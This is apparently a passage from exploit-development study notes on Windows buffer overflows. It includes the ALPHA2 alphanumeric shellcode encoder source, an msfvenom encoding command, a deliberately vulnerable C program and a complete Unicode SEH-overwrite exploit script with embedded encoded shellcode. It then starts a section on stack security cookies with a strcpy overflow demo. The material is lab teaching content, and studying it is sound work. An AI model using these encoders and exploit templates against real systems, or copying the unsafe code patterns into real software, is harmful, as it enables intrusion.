mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;ebx&quot;,      &quot;SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;esp&quot;,      &quot;TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;ebp&quot;,      &quot;UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;esi&quot;,      &quot;VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;edi&quot;,      &quot;WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;[esp]&quot;,    &quot;YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;[esp+4]&quot;,  &quot;YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; NULL, NULL &#125;<br>&#125;, uppercase_unicode_decoders[] = &#123;<br>  &#123; &quot;nops&quot;,     &quot;IAIAIAIA4444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;eax&quot;,      &quot;PPYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;ecx&quot;,      &quot;IAIAIAIA4444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;edx&quot;,      &quot;RRYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;ebx&quot;,      &quot;SSYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;esp&quot;,      &quot;TUYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;ebp&quot;,      &quot;UUYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;esi&quot;,      &quot;VVYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;edi&quot;,      &quot;WWYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;[esp]&quot;,    &quot;YAIAIAIAIA44&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;[esp+4]&quot;,  &quot;YUYAIAIAIAIA&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; NULL, NULL &#125;<br>&#125;, mixedcase_unicode_nocompress_decoders[] = &#123;<br>  &#123; &quot;nops&quot;,     &quot;444444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;eax&quot;,      &quot;PPYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;ecx&quot;,      &quot;444444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;edx&quot;,      &quot;RRYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;ebx&quot;,      &quot;SSYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;esp&quot;,      &quot;TUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;ebp&quot;,      &quot;UUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;esi&quot;,      &quot;VVYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;edi&quot;,      &quot;WWYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;[esp]&quot;,    &quot;YA4444444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; &quot;[esp+4]&quot;,  &quot;YUYA44444444444444444444444444444444444&quot; mixedcase_unicode_decoder_body &#125;,<br>  &#123; NULL, NULL &#125;<br>&#125;, uppercase_unicode_nocompress_decoders[] = &#123;<br>  &#123; &quot;nops&quot;,     &quot;44444444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;eax&quot;,      &quot;PPYA4444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;ecx&quot;,      &quot;44444444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;edx&quot;,      &quot;RRYA4444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;ebx&quot;,      &quot;SSYA4444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;esp&quot;,      &quot;TUYA4444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;ebp&quot;,      &quot;UUYA4444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;esi&quot;,      &quot;VVYA4444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;edi&quot;,      &quot;WWYA4444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;[esp]&quot;,    &quot;YA444444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; &quot;[esp+4]&quot;,  &quot;YUYA4444444444&quot; uppercase_unicode_decoder_body &#125;,<br>  &#123; NULL, NULL &#125;<br>&#125;;<br><br>struct decoder* decoders[] = &#123;<br>  mixedcase_ascii_decoders, uppercase_ascii_decoders,<br>  mixedcase_unicode_decoders, uppercase_unicode_decoders,<br>  mixedcase_ascii_nocompress_decoders, uppercase_ascii_nocompress_decoders,<br>  mixedcase_unicode_nocompress_decoders, uppercase_unicode_nocompress_decoders<br>&#125;;<br>void version(void) &#123;<br>  printf(<br>    &quot;________________________________________________________________________________\n&quot;<br>    &quot;\n&quot;<br>    &quot;    ,sSSs,,s,  ,sSSSs,  &quot; VERSION_STRING &quot;\n&quot;<br>    &quot;   SS\&quot;  Y$P\&quot;  SY\&quot;  ,SY \n&quot;<br>    &quot;  iS&#x27;   dY       ,sS\&quot;   Unicode-proof uppercase alphanumeric shellcode encoding.\n&quot;<br>    &quot;  YS,  dSb    ,sY\&quot;      &quot; COPYRIGHT &quot;\n&quot;<br>    &quot;  `\&quot;YSS&#x27;\&quot;S&#x27; &#x27;SSSSSSSP   &lt;skylined@edup.tudelft.nl&gt;\n&quot;<br>    &quot;________________________________________________________________________________\n&quot;<br>    &quot;\n&quot;<br>  );<br>  exit(EXIT_SUCCESS);<br>&#125;<br><br>void help(char* name) &#123;<br>  printf(<br>    &quot;Usage: %s [OPTION] [BASEADDRESS]\n&quot;<br>    &quot;ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.\n&quot;<br>    &quot;The result can optionaly be uppercase-only and/or unicode proof. It is a encoded\n&quot;<br>    &quot;version of your origional shellcode. It consists of baseaddress-code with some\n&quot;<br>    &quot;padding, a decoder routine and the encoded origional shellcode. This will work\n&quot;<br>    &quot;for any target OS. The resulting shellcode needs to have RWE-access to modify\n&quot;<br>    &quot;it&#x27;s own code and decode the origional shellcode in memory.\n&quot;<br>    &quot;\n&quot;<br>    &quot;BASEADDRESS\n&quot;<br>    &quot;  The decoder routine needs have it&#x27;s baseaddress in specified register(s). The\n&quot;<br>    &quot;  baseaddress-code copies the baseaddress from the given register or stack\n&quot;<br>    &quot;  location into the apropriate registers.\n&quot;<br>    &quot;eax, ecx, edx, ecx, esp, ebp, esi, edi\n&quot;<br>    &quot;  Take the baseaddress from the given register. (Unicode baseaddress code using\n&quot;<br>    &quot;  esp will overwrite the byte of memory pointed to by ebp!)\n&quot;<br>    &quot;[esp], [esp-X], [esp+X]\n&quot;<br>    &quot;  Take the baseaddress from the stack.\n&quot;<br>    &quot;seh\n&quot;<br>    &quot;  The windows \&quot;Structured Exception Handler\&quot; (seh) can be used to calculate\n&quot;<br>    &quot;  the baseaddress automatically on win32 systems. This option is not available\n&quot;<br>    &quot;  for unicode-proof shellcodes and the uppercase version isn&#x27;t 100%% reliable.\n&quot;<br>    &quot;nops\n&quot;<br>    &quot;  No baseaddress-code, just padding.  If you need to get the baseaddress from a\n&quot;<br>    &quot;  source not on the list use this option (combined with --nocompress) and\n&quot;<br>    &quot;  replace the nops with your own code. The ascii decoder needs the baseaddress\n&quot;<br>    &quot;  in registers ecx and edx, the unicode-proof decoder only in ecx.\n&quot;<br>    &quot;-n\n&quot;<br>    &quot;  Do not output a trailing newline after the shellcode.\n&quot;<br>    &quot;--nocompress\n&quot;<br>    &quot;  The baseaddress-code uses \&quot;dec\&quot;-instructions to lower the required padding\n&quot;<br>    &quot;  length. The unicode-proof code will overwrite some bytes in front of the\n&quot;<br>    &quot;  shellcode as a result. Use this option if you do not want the \&quot;dec\&quot;-s.\n&quot;<br>    &quot;--unicode\n&quot;<br>    &quot;  Make shellcode unicode-proof. This means it will only work when it gets\n&quot;<br>    &quot;  converted to unicode (inserting a &#x27;0&#x27; after each byte) before it gets\n&quot;<br>    &quot;  executed.\n&quot;<br>    &quot;--uppercase\n&quot;<br>    &quot;  Make shellcode 100%% uppercase characters, uses a few more bytes then\n&quot;<br>    &quot;  mixedcase shellcodes.\n&quot;<br>    &quot;--sources\n&quot;<br>    &quot;  Output a list of BASEADDRESS options for the given combination of --uppercase\n&quot;<br>    &quot;  and --unicode.\n&quot;<br>    &quot;--help\n&quot;<br>    &quot;  Display this help and exit\n&quot;<br>    &quot;--version\n&quot;<br>    &quot;  Output version information and exit\n&quot;<br>    &quot;\n&quot;<br>    &quot;See the source-files for further details and copying conditions. There is NO\n&quot;<br>    &quot;warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n&quot;<br>    &quot;\n&quot;<br>    &quot;Acknowledgements:\n&quot;<br>    &quot;  Thanks to rix for his phrack article on aphanumeric shellcode.\n&quot;<br>    &quot;  Thanks to obscou for his phrack article on unicode-proof shellcode.\n&quot;<br>    &quot;  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.\n&quot;<br>    &quot;\n&quot;<br>    &quot;Report bugs to &lt;skylined@edup.tudelft.nl&gt;\n&quot;,<br>    name<br>  );<br>  exit(EXIT_SUCCESS);<br>&#125;<br><br>//-----------------------------------------------------------------------------<br>int main(int argc, char* argv[], char* envp[]) &#123;<br>  int   uppercase = 0, unicode = 0, sources = 0, w32sehgetpc = 0,<br>        nonewline = 0, nocompress = 0, options = 0, spaces = 0;<br>  char* baseaddress = NULL;<br>  int   i, input, A, B, C, D, E, F;<br>  char* valid_chars;<br><br>  // Random seed<br>  struct timeval tv;<br>  struct timezone tz;<br>  gettimeofday(&amp;tv, &amp;tz);<br>  srand((int)tv.tv_sec*1000+tv.tv_usec);<br><br>  // Scan all the options and set internal variables accordingly<br>  for (i=1; i&lt;argc; i++) &#123;<br>         if (strcmp(argv[i], &quot;--help&quot;) == 0) help(argv[0]);<br>    else if (strcmp(argv[i], &quot;--version&quot;) == 0) version();<br>    else if (strcmp(argv[i], &quot;--uppercase&quot;) == 0) uppercase = 1;<br>    else if (strcmp(argv[i], &quot;--unicode&quot;) == 0) unicode = 1;<br>    else if (strcmp(argv[i], &quot;--nocompress&quot;) == 0) nocompress = 1;<br>    else if (strcmp(argv[i], &quot;--sources&quot;) == 0) sources = 1;<br>    else if (strcmp(argv[i], &quot;--spaces&quot;) == 0) spaces = 1;<br>    else if (strcmp(argv[i], &quot;-n&quot;) == 0) nonewline = 1;<br>    else if (baseaddress == NULL) baseaddress = argv[i];<br>    else &#123;<br>      fprintf(stderr, &quot;%s: more then one BASEADDRESS option: `%s&#x27; and `%s&#x27;\n&quot;<br>                      &quot;Try `%s --help&#x27; for more information.\n&quot;,<br>                      argv[0], baseaddress, argv[i], argv[0]);<br>      exit(EXIT_FAILURE);<br>    &#125;<br>  &#125;<br><br>  // No baseaddress option ?<br>  if (baseaddress == NULL) &#123;<br>    fprintf(stderr, &quot;%s: missing BASEADDRESS options.\n&quot;<br>                    &quot;Try `%s --help&#x27; for more information.\n&quot;, argv[0], argv[0]);<br>    exit(EXIT_FAILURE);<br>  &#125;<br>  // The uppercase, unicode and nocompress option determine which decoder we&#x27;ll<br>  // need to use. For each combination of these options there is an array,<br>  // indexed by the baseaddress with decoders. Pointers to these arrays have<br>  // been put in another array, we can calculate the index into this second<br>  // array like this:<br>  options = uppercase+unicode*2+nocompress*4;<br>  // decoders[options] will now point to an array of decoders for the specified<br>  // options. The array contains one decoder for every possible baseaddress.<br><br>  // Someone wants to know which baseaddress options the specified options<br>  // for uppercase, unicode and/or nocompress allow:<br>  if (sources) &#123;<br>    printf(&quot;Available options for %s%s alphanumeric shellcode:\n&quot;,<br>           uppercase ? &quot;uppercase&quot; : &quot;mixedcase&quot;,<br>           unicode ? &quot; unicode-proof&quot; : &quot;&quot;);<br>    for (i=0; decoders[options][i].id != NULL; i++) &#123;<br>      printf(&quot;  %s\n&quot;, decoders[options][i].id);<br>    &#125;<br>    printf(&quot;\n&quot;);<br>    exit(EXIT_SUCCESS);<br>  &#125;<br><br><br>  if (uppercase) &#123;<br>    if (spaces) valid_chars = &quot; 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;<br>    else valid_chars = &quot;0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;<br>  &#125; else &#123;<br>    if (spaces) valid_chars = &quot; 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;<br>    else valid_chars = &quot;0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;<br>  &#125;<br><br>  // Find and output decoder<br>  for (i=0; strcasecmp(baseaddress, decoders[options][i].id) != 0; i++) &#123;<br>    if (decoders[options][i+1].id == NULL) &#123;<br>      fprintf(stderr, &quot;%s: unrecognized baseaddress option `%s&#x27;\n&quot;<br>                      &quot;Try `%s %s%s--sources&#x27; for a list of BASEADDRESS options.\n&quot;,<br>                      argv[0], baseaddress, argv[0],<br>                      uppercase ? &quot;--uppercase &quot; : &quot;&quot;,<br>                      unicode ? &quot;--unicode &quot; : &quot;&quot;);<br>      exit(EXIT_FAILURE);<br>    &#125;<br>  &#125;<br>  printf(&quot;%s&quot;, decoders[options][i].code);<br><br>  // read, encode and output shellcode<br>  while ((input = getchar()) != EOF) &#123;<br>    // encoding AB -&gt; CD 00 EF 00<br>    A = (input &amp; 0xf0) &gt;&gt; 4;<br>    B = (input &amp; 0x0f);<br><br>    F = B;<br>    // E is arbitrary as long as EF is a valid character<br>    i = rand() % strlen(valid_chars);<br>    while ((valid_chars[i] &amp; 0x0f) != F) &#123; i = ++i % strlen(valid_chars); &#125;<br>    E = valid_chars[i] &gt;&gt; 4;<br>    // normal code uses xor, unicode-proof uses ADD.<br>    // AB -&gt;<br>    D =  unicode ? (A-E) &amp; 0x0f : (A^E);<br>    // C is arbitrary as long as CD is a valid character<br>    i = rand() % strlen(valid_chars);<br>    while ((valid_chars[i] &amp; 0x0f) != D) &#123; i = ++i % strlen(valid_chars); &#125;<br>    C = valid_chars[i] &gt;&gt; 4;<br>    printf(&quot;%c%c&quot;, (C&lt;&lt;4)+D, (E&lt;&lt;4)+F);<br>  &#125;<br>  printf(&quot;A%s&quot;, nonewline ? &quot;&quot; : &quot;\n&quot;); // Terminating &quot;A&quot;<br><br>  exit(EXIT_SUCCESS);<br>&#125;<br></code></pre></td></tr></table></figure></p>
<p>Compile in Linux, but the shellcodes can be used in Windows.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ gcc alpha2.c -o alpha2<br>$ chmod +x ./alpha2<br></code></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ ./alpha2 eax --unicode --uppercase &lt; messagebox.bin<br></code></pre></td></tr></table></figure></p>
<p>We can also use metasploit:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -a x86 --platform -p windows/messagebox icon=warning text=&#x27;HelloWorld&#x27; title=&#x27;hello&#x27; -e x86/alpha_mixed -f c<br></code></pre></td></tr></table></figure></p>
<p>In conclusion, the main difficulties include:</p>
<ul>
<li>Using memory addresses in the form of <code>00mm00mm</code> to overwrite the return address or SEH structure.</li>
<li>Using assembly instructions that contain <code>\x00</code>.</li>
<li>Shellcode must be encoded using a special algorithm; however, this increases the length of the shellcode.</li>
</ul>
<p>Another problem is that offset patterns generated by Metasploit or Mona may be unreliable, since values stored in Unicode-based registers can be unpredictable.</p>
<p>The following instructions are commonly used:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Opcode</th>
<th>Intruction</th>
</tr>
</thead>
<tbody>
<tr>
<td>61</td>
<td>POPAD</td>
</tr>
<tr>
<td>006E00</td>
<td>ADD [ESI], CH</td>
</tr>
<tr>
<td>006F00</td>
<td>ADD [EDI], CH</td>
</tr>
<tr>
<td>007000</td>
<td>ADD [EAX], DH</td>
</tr>
<tr>
<td>007100</td>
<td>ADD [ECX], DH</td>
</tr>
<tr>
<td>007200</td>
<td>ADD [EDX], DH</td>
</tr>
<tr>
<td>007300</td>
<td>ADD [EBX], DH</td>
</tr>
<tr>
<td>0500QQ00PP</td>
<td>ADD EAX, 0xPP00QQ00</td>
</tr>
<tr>
<td>2D00QQ00PP</td>
<td>SUB EAX, 0xPP00QQ00</td>
</tr>
</tbody>
</table>
</div>
<h3 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//vulnerable005.c<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;windows.h&gt;<br><br>char rock[0xE000] = &quot;...some data&quot;;<br>char Rahab[0x2000] = &quot;\x90\x58\x58\xc3&quot;; //NOP/POP/POP/RET<br><br>void foo(void *src_buf, size_t const len) &#123;<br>	size_t const BUF_LEN = 128;<br>	char bad_buf[BUF_LEN];<br>	<br>	memcpy(bad_buf, src_buf, len * 2); //bad usage!<br>&#125;<br><br>int main(int argc, char *argv[]) &#123;<br>	size_t const STR_LEN = 4096;<br>	wchar_t *unicode_buf = malloc(STR_LEN);<br>	char ascii_buf[STR_LEN];<br>	FILE *pfile;<br>	int rt;<br>	<br>	printf(&quot;Vulnerable005 starts...\n&quot;);<br>	<br>	if (argc &gt;= 2) &#123;<br>		pfile = fopen(argv[1], &quot;r&quot;);<br>		fscanf(pfile, &quot;%s&quot;, ascii_buf);<br>		rt = MultiByteToWideChar(CP_UTF7, 0, ascii_buf, -1, unicode_buf, STR_LEN);<br>		if (rt == 0) &#123;<br>			return -1;<br>		&#125;<br>		<br>		foo(unicode_buf, rt * 2);<br>	&#125;<br>	<br>	printf(&quot;Vulnerable005 ends...\n&quot;);<br>	free(unicode_buf);<br>&#125;<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.19.png'><img src="/images/books/bufferoverflow/5.19.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.20.png'><img src="/images/books/bufferoverflow/5.20.png" width="500">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona pattern_create 3000<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.21.png'><img src="/images/books/bufferoverflow/5.21.png" width="700">
    <figcaption>
    Right Click -> Follow address in stack
    </figcaption>
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.22.png'><img src="/images/books/bufferoverflow/5.22.png" width="700">
</p>

<p>Windows uses little-endian byte order. Therefore, the value used to overwrite the <code>Next</code> field is <code>0x43007900</code>, and the value used to overwrite the <code>Handler</code> field is <code>0x36004300</code>.</p>
<p>Concatenate them together: <code>0x43007900_36004300</code>.<br>Remove the null bytes (<code>\x00</code>): <code>0x43793643</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona pattern_offset 43793643<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.23.png'><img src="/images/books/bufferoverflow/5.23.png" width="700">
</p>

<p>Thus, the offset is <code>2298</code>.</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/5.24.png'><img src="/images/books/bufferoverflow/5.24.png" width="700">
</p>

<p><strong>Exploit script:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable005.cpp<br>#include &lt;string&gt;<br>#include &lt;fstream&gt;<br><br>using namespace std;<br><br>char code[] = &quot;PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYX4OM0KPKP30U9K5NQXRS44KR200TKB2LLDK0RN44KRRMXLOFW0JO6P1KONQ90FLOLS1SLLBNLMPGQHOLMKQ97Q9RUJOPRR74KPRN04KQ2OLM1Z0TKOP2XSUGPT4PLKQ8PDK0HLXTKQHMPM1Z30PSU7YSDOLQ9TKNTDKP1KOM1HVNQ7P7Q8OLMVLKQI7P8K0RUKDKSSMKHOKSMO4RUIP0X4KPXMTKQ9CRFDKLLPKDK1HMLM1HSTKLD4KKQ8PTI0DNDNDQKQK1QQIPZ0QKOYPR8QOPZ4KN2K93PKOKOKOQMYXLKKPM0KPCET31UT2NSOBNNS4BLBLM01XPL2WMVM7KOXU2JM0ZHLIKPKPM0OR0O16MP0T2ESC44KP9XLLM0KPM0PHS5BL2LROO0BW2OT2RLQTKPBJKPS815CSPVKWKOXU1ZKPQXZPH572R6KO8UA&quot;;<br><br>int main() &#123;<br>	string const EXPLOIT_FILENAME = &quot;exploit-vulnerable005.txt&quot;;<br>	ofstream fout(EXPLOIT_FILENAME.c_str());<br>	<br>	size_t const LENGTH = 2298;<br>	size_t const OFFSET = 124;<br>	<br>	string junk1(OFFSET, &#x27;A&#x27;);<br>	<br>	string shellcode(code);<br>	string junk2(LENGTH - junk1.size() - shellcode.size(), &#x27;B&#x27;);<br>	string next(&quot;\x61\x72&quot;); //0042 0042<br>	<br>	string handler(&quot;\x01\x41&quot;); //00410001, Rahab<br>	<br>	string walkcode =<br>		&quot;\x72&quot;<br>		&quot;\x05\x15\x11&quot;<br>		&quot;\x72&quot;<br>		&quot;\x2D\x11\x11&quot;<br>		&quot;\x72&quot;<br>		&quot;\x50&quot;<br>		&quot;\x72&quot;<br>		&quot;\xC3&quot;;<br>	<br>	string exploit = junk1 + shellcode + junk2 + next + handler + walkcode;<br>	<br>	fout &lt;&lt; exploit;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<h3 id="Practice——GOM-Player"><a href="#Practice——GOM-Player" class="headerlink" title="Practice——GOM Player"></a>Practice——GOM Player</h3><h1 id="Chapter-6-Offensive-and-Defensive"><a href="#Chapter-6-Offensive-and-Defensive" class="headerlink" title="Chapter 6 - Offensive and Defensive"></a>Chapter 6 - Offensive and Defensive</h1><h2 id="6-1-Security-Cookie"><a href="#6-1-Security-Cookie" class="headerlink" title="6.1 - Security Cookie"></a>6.1 - Security Cookie</h2><p>Canary</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//gf.cpp<br>#include &lt;string&gt;<br><br>void function_empty() &#123;&#125;<br><br>void function_int_2() &#123;<br>	int ia[2] = &#123; 0 &#125;;<br>&#125;<br><br>void function_int_3() &#123;<br>	int ia[3] = &#123; 0 &#125;;<br>&#125;<br><br>void function_string() &#123;<br>	std::string s;<br>&#125;<br><br>void function_char_4(char* in) &#123;<br>	char ca[4](&quot;&quot;);<br>	std::strcpy(ca, in);<br>&#125;<br><br>void function_char_5(char* in) &#123;<br>	char ca[5](&quot;&quot;);<br>	std::strcpy(ca, in);<br>&#125;<br><br>int main() &#123;<br>	static char atk[] = &quot;AAAAAAAA&quot; &quot;BBBB&quot; &quot;\xEF\xBE\xAD\xDE&quot;;<br>	function_char_5(atk);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>Use the following command to disassemble a specified function (here <code>u</code> for unassemble, since <code>d</code> has been used for <strong>display</strong>).<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uf function_string<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/6.1.png'><img src="/images/books/bufferoverflow/6.1.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/6.2.png'><img src="/images/books/bufferoverflow/6.2.png" width="700">
</p>

<p>View the security with the followign command:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dd __security_cookie l1<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/6.3.png'><img src="/images/books/bufferoverflow/6.3.png" width="700">
</p>

<p>It is a 4 or 8 bytes data.</p>
<p>Let’s view <code>function_empty</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uf function_empty<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/6.4.png'><img src="/images/books/bufferoverflow/6.4.png" width="700">
</p>

<p>This function <strong>DOES NOT</strong> have Security Cookie mechanism.</p>
<p>What if we turn off GS?</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/6.5.png'><img src="/images/books/bufferoverflow/6.5.png" width="700">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/6.6.png'><img src="/images/books/bufferoverflow/6.6.png" width="700">
</p>

<p>Now, <code>function_string</code> <strong>DOES NOT</strong> have Security Cookie mechanism.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0:000&gt; g<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/6.7.png'><img src="/images/books/bufferoverflow/6.7.png" width="700">
</p>

<h3 id="Exploiting-Security-Cookie"><a href="#Exploiting-Security-Cookie" class="headerlink" title="Exploiting Security Cookie"></a>Exploiting Security Cookie</h3><div class="table-container">
<table>
<thead>
<tr>
<th>Platform</th>
<th>IDE</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows XP SP3 x86</td>
<td>Visual Studio 2010 Express</td>
</tr>
</tbody>
</table>
</div>
